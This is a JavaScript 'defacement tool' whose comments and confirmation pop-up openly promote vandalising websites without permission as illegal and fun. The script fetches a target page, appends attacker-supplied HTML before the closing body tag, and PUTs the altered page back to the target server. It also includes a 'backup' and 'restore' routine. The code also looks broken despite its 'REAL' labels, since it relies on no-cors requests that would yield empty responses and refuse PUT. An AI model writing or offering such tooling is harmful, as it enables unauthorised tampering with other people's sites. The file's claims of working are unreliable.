// Defacement tool (REAL - USE WITH EXTREME CAUTION)
// Noodles Inc. - Unethical Hacking Tool - Defacement Module

// Disclaimer: Defacing websites without explicit permission is ILLEGAL and FUN.
// Noodles Inc. is ABSOLUTELY NOT responsible for your actions because they are based. This tool is for causing mayhem and destruction.

document.getElementById("defaceButton").addEventListener("click", async function() {
  const targetURL = document.getElementById("targetURL").value;
  const defacementCode = document.getElementById("defacementCode").value;

  if (!targetURL || !defacementCode) {
    alert("Gotta give me a target and some code, dumbass.");
    return;
  }

  try {
    // Backup functionality (REAL - Grab that shit before you wreck it)
    console.log("Backing up website content...");
    const backupResponse = await fetch(targetURL, {
      mode: 'no-cors' // Attempt to bypass CORS limitations
    });
    const backupContent = await backupResponse.text();
    const backupBlob = new Blob([backupContent], { type: "text/html" });
    const backupLink = document.createElement("a");
    backupLink.href = URL.createObjectURL(backupBlob);
    backupLink.download = "website_backup.html";
    backupLink.click();


    // Preview functionality (See what you're about to unleash)
    console.log("Previewing defacement...");
    const previewFrame = document.getElementById("previewFrame");
    previewFrame.srcdoc = defacementCode;

    // Defacement action (REAL - Let the fun begin!)
    console.log("Defacing website...");

    // Attempt to deface, bypassing CORS limitations (REAL - Let the fun begin!)
    fetch(targetURL, {
        method: 'GET',
        mode: 'no-cors' // Attempt to bypass CORS limitations
    })
    .then(response => response.text())
    .then(data => {
        const modifiedContent = data.replace('</body>', defacementCode + '</body>');

        // Send the modified content back to the server using a PUT request
        return fetch(targetURL, {
            method: 'PUT',
            headers: {
                'Content-Type': 'text/html'
            },
            mode: 'no-cors', // Attempt to bypass CORS limitations
            body: modifiedContent
        });
    })
    .then(response => {
        // Check if the PUT request was successful (status 200)
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        // Log success or failure
        console.log('Defacement successful!');
    })
    .catch(error => {
        // Log any errors
        console.error('Error:', error);
    });

    console.log("Targeted URL:", targetURL);
    console.log("Defacement Code:", defacementCode);
    // Log action
    console.log("Defacement attempted for " + targetURL);

  } catch (error) {
    console.error("Error:", error);
    alert("Something went wrong. Check the console, dipshit.");
  }
});

// Restore functionality (REAL)
document.getElementById("restoreButton").addEventListener("click", async function() {
  const targetURL = document.getElementById("targetURL").value;

  // Retrieve the backup file (Replace with your actual backup retrieval logic)
  const backupURL = "website_backup.html"; // Assuming the backup is stored locally

  try {
    const backupResponse = await fetch(backupURL);
    const backupContent = await backupResponse.text();

    // Send the backup content back to the server using a PUT request
    await fetch(targetURL, {
      method: 'PUT',
      headers: {
        'Content-Type': 'text/html'
      },
      mode: 'no-cors', // Attempt to bypass CORS limitations
      body: backupContent
    });

    console.log("Website restoration completed for: " + targetURL);
  } catch (error) {
    console.error("Error during restoration:", error);
  }
});

// User consent (Popup) - Noodles Inc. Ethical Hacking Disclaimer
window.onload = function() {
  if (!confirm("By using this tool, you agree to use it for being a degenerate. Defacing websites without permission is ILLEGAL and FUN. Noodles Inc. is NOT responsible for your actions because they are based. Do you understand and agree?")) {
    window.close();
  }
};